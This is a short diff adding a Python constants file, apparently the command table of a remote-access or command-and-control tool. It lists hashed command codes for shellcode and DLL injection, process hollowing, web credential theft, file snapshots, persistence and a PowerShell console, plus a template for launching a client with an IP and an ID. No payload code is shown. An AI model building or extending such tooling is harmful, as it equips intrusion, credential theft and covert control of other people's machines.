@@ -1,0 +1,21 @@
+
+CREAT_SEPARATED_CONSOLE  = "0x2737538258278"
+CLOSE_SEPARATED_CONSOLE  = "0x2737538258279"
+
+LIST_PROCESS_INFORMATION = "be425fd08e9ea24230bac47493228ada"
+INJECT_PROCESS_SHELLCODE = "aea87b24517d08c8ff13601406a0202e"
+RUN_LOCAL_SHELLCODE      = "2dbab3bcba2fe64f1d2133bc50796496"
+POWERSHELL_CONSOLE       = "adfd9a3aa5bc568d540db256a3782c04"
+HOLLOW_FILE_EXEC         = "b11c081208b1d6466c83e37098510d73"
+WEB_CREDENTIALS          = "5df297c2f2da83a8b45cfd012fbf9b3c"
+FILES_SNAP_FULL          = "ce52e112fb976b2d277f09b6eada379f"
+PERSITENCE               = "e5fcfe07178a109ea0c1e9bd7e9dd772"
+DLL_INJECT               = "70d78a787fc59a5deb9578a58102ae2d"
+CHANGE_CWD               = "3f1ba9eb608addfb46dac5b51f4a6d87"
+
+
+EXECUTE_INTERNAL_CLIENT  = r'start cmd /k python "{}" --ip {} --id {}'
+CHANGE_CWD_PATTERN       = r'^(3f1ba9eb608addfb46dac5b51f4a6d87)\s+([a-zA-Z0-9\s\.:\\_-]+)$'
+
+
+POWERSHELL_TUPLE = ("powershell", "powershell.exe")
